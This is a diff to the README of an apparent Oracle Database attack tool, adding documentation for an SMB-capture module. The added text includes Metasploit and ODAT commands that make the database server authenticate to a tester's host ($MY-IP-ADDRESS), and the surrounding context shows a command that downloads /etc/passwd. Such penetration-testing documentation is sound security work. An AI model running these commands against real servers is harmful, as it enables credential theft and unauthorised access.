@@ -14,6 +14,9 @@ Tested on Oracle Database __10g__ and __11g__.
 Changelog
 ====
 
+* Version __1.2__ (__2014/08/08__) : 
+ * add the *SMB* module to capture a SMB authentication
+ * add an option (*SHOW_SQL_REQUESTS_IN_VERBOSE_MODE*) in *Constants.py* to show SQL requests sent to the database server
 * Version __1.1__ (__2014/07/28__) : 
  * add the *DBMS_LOB* module useful in order to download files stored on a remote server through Oracle Database.
  * bug fix: java source code: "getenv no longer supported, use properties and -D instead"
@@ -55,6 +58,8 @@ Thanks to ODAT, you can:
  * UTL_HTTP
  * HttpUriType
  * UTL_TCP
+* __capture a SMB authentication__ through:
+ * an index in order trigger a SMB connection (NEW : 2014/08/08)
 * exploit the __CVE-2012-313__ (http://cvedetails.com/cve/2012-3137)
  * pickup the session key and salt for arbitrary users
  * attack by dictionary on sessions
@@ -449,6 +454,30 @@ This module uses the DBMS_LOB Oracle library to download files remotely.
 * To download the passwd file stored in */etc/* to the tmp.txt local file:
 ```bash
 ./odat.py dbmslob -s $SERVER -d $SID -U $USER -P $PASSWORD --getFile /etc/ passwd temp.txt
+```
+
+ *smb* module (NEW : 2014/08/08)
+---
+
+This module allows to capture a SMB authentication.
+
+Prerequisite in order to capture a challenge: 
+* Oracle Database must be installed on __Windows__
+* Oracle Database services must __not__ used a Windows __network service__ account, a __system__ account or a __local service__ account.
+
+Notice: To use this module, a tool to capture SMB authentication must be used (examples: metasploit or responder).
+
+* In this example, I have used the *auxiliary/server/capture/smb* metasploit module to capture the SMB authentication:
+```bash
+msfconsole
+[...]
+msf auxiliary(smb) > use auxiliary/server/capture/smb
+msf auxiliary(smb) > run
+```
+
+* To make connect the Oracle Database server to our smb server, the following ODAT command can be used :
+```bash
+./odat.py smb -s $SERVER -d $SID -U $USER -P $PASSWORD --capture $MY-IP-ADDRESS SHARE-NAME
 ```
 
  *stealRemotePwds* module
